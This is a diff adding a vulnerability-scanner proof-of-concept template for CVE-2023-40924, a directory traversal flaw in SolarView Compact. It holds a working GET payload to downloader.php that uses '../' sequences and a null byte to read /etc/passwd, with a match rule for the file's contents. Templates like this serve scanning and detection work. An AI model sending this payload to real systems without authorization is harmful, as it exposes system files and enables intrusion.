@@ -1,0 +1,15 @@
+id: poc-yaml-solarview-compact-downloader-php-directory-traversal
+info:
+  name: SolarView Compact 目录遍历漏洞(CVE-2023-40924)
+  severity: medium
+  tags:
+  - CVE-2023-40924
+  - 路径遍历
+  finger: SolarView Compact
+requests:
+- method: GET
+  path: /downloader.php?file=../../../../../../../../etc/passwd%00.jpg
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"bin")
+    && !contains(body, "<")
+variables: {}
+transport: http
